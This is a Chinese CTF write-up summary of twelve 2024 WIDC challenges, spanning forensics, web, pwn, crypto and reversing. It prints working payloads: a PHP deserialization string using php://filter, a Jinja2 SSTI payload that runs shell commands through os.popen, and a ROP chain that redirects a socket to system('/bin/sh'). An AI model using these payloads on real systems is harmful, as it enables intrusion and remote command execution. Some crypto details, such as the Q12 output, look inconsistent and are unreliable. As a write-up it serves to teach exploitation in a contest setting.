---
title: 2024 WIDC writeup by Arr3stY0u
contest: 2024 WIDC 世界智能大会 / 网络安全竞赛
year: 2024
difficulty: hard
vuln_type: [stego_traffic, deserialize, ssti, rce, ret2libc, crypto_oracle, crypto_rsa, lattice, reverse, heap_exploit, web_unknown]
tags: [RTSP, GPS-NMEA, php://filter, SSTI, gs-pjl, libc-2.31, AES-ECB, AES-CBC, pycdc, LLL, GaussLattice, RSA, JNI, Android-NDK, opcodes-VM, sm4]
attack_chain: ["Q1 流量: rtsp://ubnt:wbox123@172.10.0.12:8554/live 摄像头流", "Q2 GPS: pynmea2 解析 $GPGGA → folium PolyLine 画地图", "Q3 PHP 反序列化: show.filename = php://filter/read=convert.base64-encode/resource=trueflag.php", "Q4 SSTI: {{ config.__class__.__init__.__globals__['os'].popen(...) }}", "Q5 PJL: gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl", "Q6 pwn: libc-2.31 HTTP 服务器 ROP 链 → system('/bin/sh') dup2(SOCKFD)", "Q7 crypto: AES/ECB/ZeroBytePadding key=esa7*4", "Q8 .pyc 反编译: pycdc 1.pyc → encrypt AES-CBC PKCS7", "Q9 RSA: LLL 降维 + 短向量恢复 p q (GaussLatticeReduction)", "Q10 Android: jni getFlag 字符串异或爆破 ^ 3 + (j mod 26)", "Q11 加密私钥 ENCRYPTED PRIVATE KEY 离线解密 flag", "Q12 SM4: cipflag + randomiv → 大数 long_to_bytes 恢复"]
key_payload: "RSA m= 67557894833899879721535443738683635889742076553897445643184762026832680586233392404925048827896424102785684459189389647962484"
one_liner: WIDC 2024 综合靶场 12 大题：RTSP/GPS/PHP/SSTI/PJL/pwn/AES/pyc/LLL/JNI
lesson: 综合 CTF 赛要全栈能力 — 取证/RCE/反序列化/密码/逆向/堆 全都要会
quality: high
---

# 2024 WIDC writeup by Arr3stY0u

原文 https://www.ctfiot.com/183712.html

## 12 大题概览

### Q1: 摄像头 RTSP 流
`rtsp://ubnt:wbox123@172.10.0.12:8554/live` — 弱密码 `ubnt/wbox123`

### Q2: GPS NMEA 解析
```python
import pynmea2, folium, os
def parse_file(file_path):
    f = open(file_path, "r", encoding="utf-8")
    line = f.readline()
    locations = []
    while line:
        msg = pynmea2.parse(line)
        if msg.latitude != 0.0 and msg.longitude != 0.0:
            locations.append([msg.latitude, msg.longitude])
        line = f.readline()
    return locations

locations = parse_file("./a.dat")
m = folium.Map(locations[0], zoom_start=15)
folium.PolyLine(locations, weight=3, color='orange', opacity=0.8).add_to(m)
folium.Marker(locations[0], popup='Starting Point').add_to(m)
folium.Marker(locations[-1], popup='End Point').add_to(m)
m.save("./index.html")
```

### Q3: PHP 反序列化
```php
class show {
    public $filename;
    function printContent() {
        $content = file_get_contents($this->filename);
        echo $content;
    }
}
$a = new show();
$a->filename = "php://filter/read=convert.base64-encode/resource=trueflag.php";
echo serialize($a);
```
POST：
```
show=O:4:"show":1:{s:8:"filename";s:61:"php://filter/read=convert.base64-encode/resource=trueflag.php";}
```

### Q4: SSTI
```
user={{ config.__class__.__init__.__globals__['os'].popen('cat ./flag/flag').read() }}&pwd=testyjyj
```

### Q5: Ghostscript PJL 注入
```
gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl
```

### Q6: HTTP 服务器 ROP (libc-2.31)
```python
py = flat({0: b'GET /', 255: b'r', 0x138: [payload]}, filler=b'\x00')
rop = ROP(elf)
rop.http_response(4, elf.got['write'])  # leak write
libcbase = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['write']
rop = ROP(libc)
rop.dup2(SOCKFD, 0); rop.dup2(SOCKFD, 1); rop.dup2(SOCKFD, 2)
rop.system(next(libc.search(b'/bin/sh')))
```

### Q7: AES/ECB/ZeroBytePadding
密文 + key=esa7esa7esa7esa7 (16 字节) → 直接解密

### Q8: pyc 反编译
```
pycdc 1.pyc
```
→ 还原 AES-CBC + PKCS7 + base64 输出

### Q9: RSA LLL 短向量攻击
```python
from sage.all import *
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1, v2])
shortest_vector = m.LLL()[0]
# 短向量 = [f, f*h] mod p，f 就是 n 的因数
f, g = abs(shortest_vector[0]), abs(shortest_vector[1])
# Decrypt
a = f*c % p % g
m_dec = a * inverse_mod(f, g) % g
print(long_to_bytes(int(m_dec)))
```
恢复出 `b'f2jmf5ld0akrqhxmd7ig3ad22b0eda76e391RQ9tZMH5CBjPthat'`

### Q10: Android JNI getFlag 异或 + 字符转换
```c
for (int i = 0; i < 56; i++) {
    for (int j = 0; j < 0x7f; j++) {
        unsigned char tmp = j;
        if (j >= 0x30 && j <= 0x39) tmp = ((j - 45) % 0xA) | 0x30;
        if (j >= 'A' && j <= 'Z') tmp = (j - 62) % 26 + 65;
        if (j >= 'a' && j <= 'z') tmp = (j - 94) % 26 + 97;
        tmp ^= 3;
        if (tmp == enc[i]) { putchar(j); break; }
    }
}
```

### Q11: ENCRYPTED PRIVATE KEY
openssl 离线解密私钥 → flag

### Q12: SM4 / 大数还原
```python
>>> 0x3836353635367830.to_bytes(32, 'big')
b'...865656x0'
```

## 教学价值
- **WIDC** = 世界智能大会网络安全竞赛
- 综合赛 12 大题考察：流量/取证/反序列化/SSTI/PJL/pwn/AES/pyc/LLL/JNI
- **LLL 短向量攻击** 解决特殊 RSA（n = f*g h + p*k 结构）
- **AES ZeroBytePadding** 容易识别（明文长度对齐块大小）
- **GPS NMEA** 解析用 pynmea2 + folium 可视化
- 实战能力要求全面

## 工具清单
- Wireshark / rtsp client
- pynmea2 / folium
- php://filter
- Jinja2 SSTI payload
- Ghostscript
- pwntools (libc-2.31)
- pycdc
- Sage LLL
- IDA Pro / jadx (Android JNI)
- openssl
